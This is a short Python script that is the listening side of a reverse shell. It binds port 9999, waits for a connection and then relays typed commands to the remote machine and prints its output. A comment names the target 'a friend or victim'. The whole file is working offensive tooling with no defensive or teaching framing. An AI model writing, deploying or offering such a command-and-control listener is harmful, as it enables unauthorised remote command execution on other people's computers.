import sys
import socket
import threading
import time
from queue import Queue


# Creating a socket with python 😊
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error "+str(msg))


# Binding the socket listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port "+str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Binding Error "+str(msg)+"\n"+"Retrying...")
        bind_socket()


# Establish connection with cliet and socket with listening
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established"+ " IP "+address[0]+" | Port "+str(address[1]))
    send_commands(conn)
    conn.close()


#send command to a friend or victim
def send_commands(conn):
    while True:
        cmd = input()

        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_reponse = str(conn.recv(1024),"utf-8")
            print(client_reponse,end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
